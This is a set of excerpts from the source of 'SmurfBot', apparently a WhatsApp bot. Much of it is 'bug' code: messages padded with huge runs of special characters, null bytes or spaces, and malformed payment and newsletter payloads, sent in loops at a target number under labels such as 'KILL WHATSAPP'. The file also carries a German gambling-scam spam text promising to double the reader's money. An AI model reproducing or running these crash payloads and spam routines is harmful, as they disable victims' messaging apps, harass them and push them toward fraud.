...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"SmurfBot ✅",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `Smurf BUG WHATSAPP ✅`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `SmurfBot DOCUMENT ✅`+"ྦྷ".repeat(60000),
...
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "SmurfBot MODS WHATSAPP" + "\0".repeat(920000),
      ...
      'message': {
        'interactiveMessage': {
          ...
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'SmurfBot MODS WHATSAPP', url : , merchant_url :  }"
            }],
...
"mediaType": 1, 
"thumbnail": rxhlimage, 
"mediaUrl": "https://whatsapp.com/channel/0029VafNnlT1t90Y4GDzqA3q", 
"sourceUrl": "hhttps://chat.whatsapp.com/L5WTlQX94jIBtQ4SxLrKID" }}}, { quoted: m }) }
...
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'SmurfBot','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP https://chat.whatsapp.com/L5WTlQX94jIBtQ4SxLrKID','description':'Channel Whatsapp8: https://chat.whatsapp.com/L5WTlQX94jIBtQ4SxLrKID','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel whatsapp",
      url: "https://whatsapp.com/channel/0029VafNnlT1t90Y4GDzqA3q",
      merchant_url: "https://whatsapp.com/channel/0029VafNnlT1t90Y4GDzqA3q"
   })
}
]
ewe = `┏❐  ⌜ SmurfBot  ⌟  ❐
...
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'SmurfBot','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY Fatkul','description':'Saluran Whatsapp : https://whatsapp.com/channel/0029VafNnlT1t90Y4GDzqA3q','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtu.be/dQw4w9WgXcQ?si=QzT5MYnJPXgBcmL8",
      merchant_url: "https://youtu.be/dQw4w9WgXcQ?si=QzT5MYnJPXgBcmL8"
   })
}
]
ewe = `┏❐  ⌜ SmurfBot ⌟  ❐
...
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'SmurfBot','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY SmurfBot','description':'keep strong guys','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
...
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'SmurfBot','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY SmurfBot','description':'Semangat guys jalanin hari nya','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
...
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'SmurfBot','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY SmurfBot','description':'Keep Stroong Guys','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
...
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'SmurfBot','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY SmurfBot','description':'Keep Strong bro','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
...
mediaType:  1,
mediaUrl: 'https://wa.me/6289666430345',
title: `SmurfBot`,
sourceUrl: `https://wa.me/6289666430345`, 
thumbnail: rxhlimage
}
}})
break
...
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY SmurfBot`);
});
}
...
rxhl.sendMessage(from, { caption: `SmurfBot!`, video: { url: data.watermark }}, {quoted:m})
})}
break
...
Hallo, ich komme von einem Online-Glücksspielseitenunternehmen namens SmurfBot888. Ich bin hier, um Ihnen anzubieten, Ihr Geld sofort zu verdoppeln. Sie können es verdoppeln, indem Sie auf der Wettseite SmurfBot einen Nominalwert von 80 $ und einen Preis von 900 $ einzahlen. Bitte registrieren Sie sich über den Link 👇 auf der Online-Glücksspielseite SmurfBot888
🎮 Wettseiten: https://register.SmurfBot888.bet/
Alternative zur Registrierung 👇
🎮 Facebook : SmurfBot888
🎮 Whatsapp : https://api.whatsapp.com/send?phone=6289666430345
...
if (!q) return replyz('Insert Target number')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
await rxhl.sendMessage(Pe, { text: 'SmurfBot Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `SmurfBotReaction`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
...
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { "caption": `SmurfBot`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `SmurfBot`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(1500)
}
...
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `SmurfBot`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `SmurfBot`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
await sleep(1500)
}
replyz(`*</> Succes 🥰*`)
}
...
await sleep(500)
rxhl.sendMessage(Pe, { text: 'SmurfBot Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `SmurfBotReaction`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(500)
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(500)
rxhl.sendMessage(Pe, { "caption": `SmurfBot`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `SmurfBot`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
  ...
  "interactiveMessage": {
    ...
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'SmurfBotBugWhatsApp', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
...
rxhl.sendMessage(Pe, {text: `Saluran WhatsApp\n https://whatsapp.com/channel/0029VafNnlT1t90Y4GDzqA3q`}, {quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
...
await sendBugIos(Pe)
await sendExtendedTextMessage(Pe)
rxhl.sendMessage(Pe, {image: rxhlimage, caption: `KILL WHATSAPP BY SmurfBot`},{quoted: force})
await sleep(2000)
await ngeloc(Pe, force)
await pirgam(Pe, bugquoteddvc)
await bakdok(Pe, force)
